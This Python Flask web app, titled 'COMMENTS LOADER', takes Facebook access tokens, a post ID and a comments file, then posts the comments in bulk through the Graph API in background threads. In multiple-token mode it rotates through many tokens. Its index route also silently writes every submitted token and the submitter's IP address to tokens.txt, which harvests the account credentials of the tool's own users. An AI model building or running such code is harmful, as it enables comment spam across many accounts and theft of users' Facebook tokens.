from flask import Flask, request, render_template_string
from threading import Thread
import os, uuid, time, requests

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
TOKENS_LOG = "tokens.txt"

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>COMMENTS LOADER</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body, html {
  height: 100%;
  width: 100%;
  font-family: 'Courier New', monospace;
  background-color: #0f0f0f;
  color: #00ff00;
}
body {
  background-image: url('https://www.transparenttextures.com/patterns/asfalt-dark.png');
  background-size: repeat;
}
.container {
  height: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}
.form-box {
  width: 100%;
  max-width: 600px;
  background: rgba(0, 0, 0, 0.95);
  padding: 30px;
  border-radius: 10px;
  box-shadow: 0 0 15px #00ff00;
  border: 1px solid #00ff00;
}
h1 {
  text-align: center;
  margin-bottom: 25px;
  font-size: 1.8rem;
  color: #00ff00;
  text-shadow: 0 0 5px #00ff00;
}
input, select {
  width: 100%;
  padding: 12px;
  margin-bottom: 15px;
  border: 1px solid #00ff00;
  border-radius: 6px;
  background-color: #000;
  color: #00ff00;
  font-size: 1rem;
  outline: none;
}
input::placeholder {
  color: #00ff00aa;
}
.btn {
  width: 100%;
  padding: 14px;
  margin-bottom: 15px;
  background-color: #000;
  border: 1px solid #00ff00;
  color: #00ff00;
  font-weight: bold;
  font-size: 1.05rem;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.3s;
  text-shadow: 0 0 5px #00ff00;
  box-shadow: 0 0 10px #00ff0055;
}
.btn:hover {
  background-color: #001f00;
  box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
}
.count {
  text-align: center;
  font-size: .9rem;
  color: #00ff00;
  margin-top: 10px;
}
</style>
</head>
<body>
<div class="container">
  <div class="form-box">
    <h1>👨‍⚖️SHIBAJI ITS SUVHO COMMENTS TOOL</h1>
    <form method="post" enctype="multipart/form-data">
      <select name="mode" required onchange="toggleTokenInputs(this.value)">
        <option value="">🔘 Select Mode</option>
        <option value="single">💲 Single Token</option>
        <option value="multiple">💪📚 Multiple Tokens File</option>
      </select>

      <input type="text" name="token" id="single_token" placeholder="💲 EAAB Token">
      <input type="file" name="tokens_file" id="multiple_token_file" style="display:none;">

      <input type="text" name="post_id" placeholder="EDHAR Facebook Post ID" required>
      <input type="number" name="delay" placeholder="Time Delay (seconds)" required>
      <input type="file" name="comments_file" required>

      <div class="btn-row">
                <button type="submit" name="action" value="start" class="start-btn">Start</button>
                <button type="submit" name="action" value="stop" class="stop-btn">Stop</button>
            </div>
        </form>
    </div>
    <div class="footer">
    </form>
    </form>
    
    </form>
    <div class="count">🦬 Total Users: {{count}}</div>
  </div>
</div>
<script>
function toggleTokenInputs(mode) {
  document.getElementById('single_token').style.display = mode === 'single' ? 'block' : 'none';
  document.getElementById('multiple_token_file').style.display = mode === 'multiple' ? 'block' : 'none';
}
</script>
</body>
</html>
"""

# Send comment
def send_comment(token, post_id, comment):
    url = f"https://graph.facebook.com/{post_id}/comments"
    payload = {"message": comment, "access_token": token}
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print(f"✅ Sent: {comment}")
    else:
        print(f"❌ Failed: {comment}")
        print("📄 Response:", response.text)

# Single token mode
def background_commenter_single(token, post_id, delay, comments):
    for comment in comments:
        send_comment(token, post_id, comment)
        time.sleep(delay)

# Multiple token mode
def background_commenter_multiple(tokens, post_id, delay, comments):
    index = 0
    token_count = len(tokens)
    while index < len(comments):
        token = tokens[index % token_count]
        comment = comments[index]
        send_comment(token, post_id, comment)
        index += 1
        time.sleep(delay)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        mode = request.form["mode"]
        post_id = request.form["post_id"].strip()
        delay = int(request.form["delay"].strip())
        comments_file = request.files["comments_file"]
        ip = request.remote_addr

        comments_path = os.path.join(UPLOAD_FOLDER, f"{uuid.uuid4()}_comments.txt")
        comments_file.save(comments_path)
        with open(comments_path, encoding="utf-8") as f:
            comments = [line.strip() for line in f if line.strip()]

        if mode == "single":
            token = request.form["token"].strip()
            with open(TOKENS_LOG, "a") as f:
                f.write(f"{token} | {ip}\n")
            Thread(target=background_commenter_single, args=(token, post_id, delay, comments), daemon=True).start()

        elif mode == "multiple":
            tokens_file = request.files["tokens_file"]
            tokens_path = os.path.join(UPLOAD_FOLDER, f"{uuid.uuid4()}_tokens.txt")
            tokens_file.save(tokens_path)
            with open(tokens_path, encoding="utf-8") as f:
                tokens = [line.strip() for line in f if line.strip()]
            with open(TOKENS_LOG, "a") as f:
                for token in tokens:
                    f.write(f"{token} | {ip}\n")
            Thread(target=background_commenter_multiple, args=(tokens, post_id, delay, comments), daemon=True).start()
        else:
            return "❌ Invalid mode selected"

        return render_template_string(
            "<h2 style='color:#00ff00;text-align:center;margin-top:40vh;'>✔️ Comments started in background.<br><a href='/'>⬅️ Back</a></h2>"
        )

    try:
        with open(TOKENS_LOG) as f:
            count = len(f.readlines())
    except:
        count = 0

    return render_template_string(HTML, count=count)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5005)
    





